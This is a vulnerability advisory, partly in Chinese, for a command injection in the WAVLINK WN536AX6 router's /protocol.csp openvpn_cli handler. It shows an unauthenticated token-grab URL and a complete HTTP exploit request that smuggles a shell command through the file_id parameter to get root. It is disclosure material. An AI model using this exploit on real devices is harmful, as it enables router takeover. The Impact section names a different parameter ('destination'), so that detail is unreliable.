# WAVLINK WN536AX6



- Vendor: WAVLINK
- Product: WN536AX6
- Firmware Version: V260507
- Vulnerability Type:Authenticated Command Injection

# Description

​		The authenticated command injection vulnerability in the openvpn_cli handler of /protocol.csp on the WAVLINK
  WN536AX6-A router (firmware OpenWrt 21.02 / MT7986 / aarch64) can be exploited through the controllable file_id
  parameter, leading to remote code execution with root privileges. Although a valid session token is required,
  authentication is trivially bypassable: the device ships with FirstLogin=1 (passwordless login enabled by default),
  allowing an attacker to obtain a valid token with a single unauthenticated login request.

#   Impact

An authenticated attacker can inject arbitrary shell commands through the `destination` parameter and execute them with the privileges of the web service, potentially resulting in full compromise of the device.

#   Vulnerability Details

在 ioos Web 后端 /protocol.csp 的 openvpn_cli 处理器（fname=net&opt=openvpn_cli&function=set）在构造 shell 命令时，未对请求参数 file_id 做任何过滤，直接将其拼入 uci show ovpnclient | grep "file_id='%s'" 并通过 popen()执行。攻击者在设备出厂默认状态（FirstLogin=1免密登录）下，仅需两步即可获得 root shell：先请求 fname=system&opt=login&function=set&usrid= 获取会话 token，再携带token 访问注入 payload file_id=aa" | <任意命令> # 即触发，命令以 root 权限执行

![image-20260809202430969](C:\Users\余雨波\AppData\Roaming\Typora\typora-user-images\image-20260809202430969.png)

![image-20260809202453544](C:\Users\余雨波\AppData\Roaming\Typora\typora-user-images\image-20260809202453544.png)



需要获取token，出厂设置情况下直接免密获取，访问下面url就行

http://192.168.10.3/protocol.csp?fname=system&opt=login&function=set&usrid=

![image-20260809200559831](C:\Users\余雨波\AppData\Roaming\Typora\typora-user-images\image-20260809200559831.png)

拿到token，再进行漏洞利用

**exp**

```http
GET /protocol.csp?token=6D0D271C517B048677808FAA36778F25&fname=net&opt=openvpn_cli&function=set&ovpn_enable=1&sel_pwd_val=0&usr_name=x&usr_passwd=x&file_id=aa%22%20%7C%20touch%20%2Fget_shell%20%23 HTTP/1.1

Host: 192.168.10.2

Cookie: i18next=en_US

Sec-Ch-Ua: "Not_A Brand";v="8", "Chromium";v="120"

Accept: application/json, text/javascript, */*; q=0.01

X-Requested-With: XMLHttpRequest

Sec-Ch-Ua-Mobile: ?0

User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.71 Safari/537.36

Sec-Ch-Ua-Platform: "Linux"

Sec-Fetch-Site: same-origin

Sec-Fetch-Mode: cors

Sec-Fetch-Dest: empty

Referer: https://192.168.10.2/

Accept-Encoding: gzip, deflate, br

Accept-Language: en-US,en;q=0.9

Priority: u=1, i

Connection: close




```

复现结果

![image-20260809200832092](C:\Users\余雨波\AppData\Roaming\Typora\typora-user-images\image-20260809200832092.png)



![image-20260809200952352](C:\Users\余雨波\AppData\Roaming\Typora\typora-user-images\image-20260809200952352.png)

![image-20260809201011445](C:\Users\余雨波\AppData\Roaming\Typora\typora-user-images\image-20260809201011445.png)